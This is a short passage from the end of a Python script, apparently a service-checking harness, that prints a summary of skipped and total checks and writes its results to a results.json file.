          f"skipped (service down): {skipped} | total checks: {len(RESULTS)}")

    out = Path(__file__).with_name("results.json")
    out.write_text(json.dumps([asdict(r) for r in RESULTS], indent=2))
    print(f"Machine-readable results written to {out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
